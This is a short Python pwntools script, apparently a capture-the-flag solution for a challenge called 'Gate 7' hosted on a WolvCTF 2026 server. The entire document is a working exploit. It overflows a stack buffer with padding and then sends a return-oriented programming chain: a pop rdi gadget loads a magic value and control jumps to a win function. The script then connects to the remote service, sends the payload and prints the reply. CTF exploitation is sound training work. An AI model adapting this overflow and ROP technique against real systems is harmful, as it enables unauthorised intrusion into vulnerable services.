from pwn import *

context.arch = 'amd64'
context.log_level = 'error'

HOST, PORT = 'gate7.wolvctf-2026.kctf.cloud', 1337
POP_RDI, RET, WIN, MAGIC = 0x401206, 0x401207, 0x40120b, 0xc0ffee

payload  = b'A' * 0x30
payload += b'B' * 8
payload += p64(POP_RDI) + p64(MAGIC) + p64(RET) + p64(WIN)
payload = payload.ljust(0x80, b'\x00')

io = remote(HOST, PORT)
io.recvuntil(b'Gate 7 keypad. Enter access code:')
io.send(payload)
print(io.recvall(timeout=5).decode())
